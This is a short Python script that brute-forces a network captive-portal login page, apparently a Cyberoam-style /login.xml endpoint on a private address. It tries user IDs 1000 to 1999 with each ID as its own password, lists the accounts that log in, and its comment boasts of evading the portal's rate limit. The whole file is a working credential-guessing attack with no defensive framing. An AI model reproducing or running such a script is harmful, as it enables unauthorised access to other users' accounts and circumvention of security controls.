#!/usr/bin/env python3

import time
import requests
from colorama import Fore, init
init()

URL = 'http://172.16.1.1:8090'
TIMESTAMP = str(time.time()*1000)[:13]
success = []

headers = {
    'Origin': URL,
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.8,hi;q=0.6',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Accept': '*/*',
    'Referer': 'URL',
    'Connection': 'keep-alive',
    'DNT': '1',
}


def try_login(user_id, user_pwd):
    data = 'mode=191&username={}&password={}&a={}&producttype=0'.format(user_id, user_pwd, TIMESTAMP)
    r = requests.post(URL+'/login.xml', headers=headers, data=data)
    if "successfully logged in" in  r.text or "Maximum Login Limit" in r.text:
        print(Fore.GREEN, user_id, Fore.RESET, flush=True)
        success.append(user_id)
    else:
        print(Fore.RED, user_id, Fore.RESET, flush=True)
    time.sleep(0.05) # easily circumvents stupid rate limit of 125 per second



if __name__ == '__main__':
    for i in range(1000, 2000):
        try_login(i, i)
    print(Fore.GREEN, success, Fore.RESET) # list of all found IDs
